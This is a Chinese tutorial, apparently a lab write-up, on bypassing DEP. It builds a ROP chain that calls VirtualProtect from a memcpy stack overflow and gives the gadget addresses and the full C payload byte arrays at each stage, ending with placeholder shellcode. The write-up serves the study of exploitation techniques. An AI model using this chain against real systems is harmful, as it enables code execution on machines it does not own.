核心思想：当程序开启DEP后，可以通过`VirtualProtect`函数修改内存属性，达到绕过DEP的目的

## VirtualProtect函数

```
BOOL VirtualProtect(
LPVOID lpAddress, // 要更改属性的内存地址
DWORD dwSize, // 要更改属性的内存大小
DWORD flNewProtect, // 内存的新的属性，设置为0x40时为可读可写可执行
PDWORD lpflOldProtect ); // 内存原始属性的保存地址
```
因此如果栈如下布置的话，就可以将shellcode所在内存区域设为可执行模式。
`VirtualProtect`(
shellcode所在内存空间起始地址，
shellcode大小，
`0x40`,
某个可写地址)

注意：
参数中包含`0x00`，因此漏洞函数改为`memcpy`函数

### 第一阶段：修复EBP

3、由于溢出时EBP被破坏，因此先通过`PUSH ESP,POP EBP,RETN`修复EBP（和上次实验一样）。通过`OllyFindAddr`查找即可。我们选择`0x5D1D8B85`
![图片描述](upload/attach/202002/713428_C3GMCP4N938DEPP.png)

4、修改shellcode，
```
char shell[] = {"\x90\x90\x90\x90\x90\x90\x90\x90"\
"\x85\x8b\x1d\x5d"};
```
![图片描述](upload/attach/202002/713428_KA96T34EWVAYCZ2.png)
发现执行完`retn 0x4`后，ESP刚好指向EBP+8的位置。
（1）于是想如果能找到`mov [ebp],xx pop xx,pop xx,pop xx,retn`指令或者`mov [ebp],xx jmp xx`指令不就能修改ebp+8的值了吗？（为什么要pop?因为有两个参数我们不能动）但是这两种指令都找不到。
（2）如果让ESP下移4个字节，再执行`push esp retn/jmp xx`指令也可以。因此可使用`retn`指令将ESP下移4个字节而又不影响程序的控制；再使用`push esp jmp eax`，但需要将eax的指令修改一下。

### 第二阶段：将ESP下移4个字节，并使用push esp jmp eax

1、使用OD插件`OllyFindAddr`->自定义寻找`0xC3`，找到`retn`的地址`0x7dd02d4c`
![图片描述](upload/attach/202002/713428_PAU8N374DYXCN9N.png)
由于OD找不到`push esp jmp eax`的地址，因此我使用Immunity Debugger中的mona插件寻找，使用如下命令，找到地址为`0x77ebc6c6`，截图忘了截了，反正找到了~
![图片描述](upload/attach/202002/713428_YY6UCEBMWQHGC29.png)

3、修改shellcode
```
char shell[] = {"\x90\x90\x90\x90\x90\x90\x90\x90"\
"\x85\x8b\x1d\x5d"//修改ebp
"\x4c\x2d\xd0\x7d"// retn
"\x90\x90\x90\x90"
"\xc6\xc6\xeb\x77"};//push esp jmp eax
```
提问：中间需要插入4个字节的空字符。
答案：因为`push esp pop ebp retn 0x4`指令中，最后`retn`后面紧跟`0x4`说明`retn`后，esp下移8个字节，因此需要填充4个空字节。

### 第三阶段：修改EBP+0x14
思路：如果我们将ESP指向EBP+0x18，就可以通过`push esp jmp eax`指令来设置EBP+0x14的参数了。
此时ESP指向EBP+0X4，因此使用`pop pop pop retn`指令就能使ESP指向EBP+0X18了！

1、利用`OllyFindAddr`找到`pop pop pop retn`的地址`0x76B1B0BD` 注意不要`pop esp ebp eax`，因为这三个寄存器以后都要用
![图片描述](upload/attach/201903/713428_MXDCPQGC73DW4P4.png)

2、有了这条指令如何让程序去执行呢？
思路：刚才我们知道，当程序执行到`push esp jmp eax`时，要跳转到eax，因此我们只需要将`pop pop pop retn`的地址赋值给eax即可。
如何赋值呢？使用`pop eax`即可。
利用`OllyFindAddr`找到`pop eax retn`的地址`0x7D6EB7FD`
![图片描述](upload/attach/201903/713428_2F4NQT9SXYBQFXC.png)

3、修改shellcode
```

"\xfd\xb7\x6e\x7d"//pop eax
"\xbd\xb0\xb1\x76"// pop pop pop retn
"\x85\x8b\x1d\x5d"//修改ebp
"\x4c\x2d\xd0\x7d"// retn
"\x90\x90\x90\x90"
"\xc6\xc6\xeb\x77"};//push esp jmp eax
```

### 第四阶段：填充参数，运行VirtualProtect
接下来直接填写`VirtualProtect`的另外两个固定参数`0x000000ff`和`0x00000040`，接着继续调用`push esp jmp eax`
```
char shell[] = {"\x90\x90\x90\x90\x90\x90\x90\x90"\
"\xfd\xb7\x6e\x7d"//pop eax
"\xbd\xb0\xb1\x76"// pop pop pop retn
"\x85\x8b\x1d\x5d"//修改ebp
"\x4c\x2d\xd0\x7d"// retn
"\x90\x90\x90\x90"
"\xc6\xc6\xeb\x77"//push esp jmp eax
"\xff\x00\x00\x00"
"\x40\x00\x00\x00"
"\xc6\xc6\xeb\x77"//push esp jmp eax（1）
"\x90\x90\x90\x90"（2）
"\x90\x90\x90\x90"（3）
"\xd9\x1a\x80\x7c"};// VirtualProtect的地址
```

### 第五阶段：布置shellcode的位置
修改shellcode
```
char shell[] = {"\x90\x90\x90\x90\x90\x90\x90\x90"\
"\xfd\xb7\x6e\x7d"//pop eax
"\xbd\xb0\xb1\x76"// pop pop pop retn
"\x85\x8b\x1d\x5d"//修改ebp
"\x4c\x2d\xd0\x7d"// retn
"\x90\x90\x90\x90"
"\xc6\xc6\xeb\x77"//push esp jmp eax
"\xff\x00\x00\x00"
"\x40\x00\x00\x00"
"\xc6\xc6\xeb\x77"//push esp jmp eax
"\x90\x90\x90\x90"// 为什么要填充（回答过了）
"\x90\x90\x90\x90"
"\xd9\x1a\x80\x7c"// VirtualProtect的地址
"\x90\x90\x90\x90"// 为什么要填充
"\x7b\x8e\xd3\x7d"// jmp esp
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
……………..};//shellcode
```
由于执行完`Virutalprotect`之后，在`retn`之前，堆栈顶部是`0x0013ffa8`，而`vitualprotect`的地址我们布置在了`0x0013ffa0`，因此在`jmp esp`需要4字节的填充。
执行`jmp esp`之前：esp执行`0x0013ffa8`
![图片描述](upload/attach/201903/713428_JZPB9UKYE76Z2HP.png)
执行完`jmp esp`后：esp指向`0x0013ffbc`
![图片描述](upload/attach/201903/713428_GYEYTK2NQM6Z8YA.png)
中间相差了16个字节，因此需填充16个字节。再布置shellcode.
Shellcode先用`0x41414141`代替
运行成功！
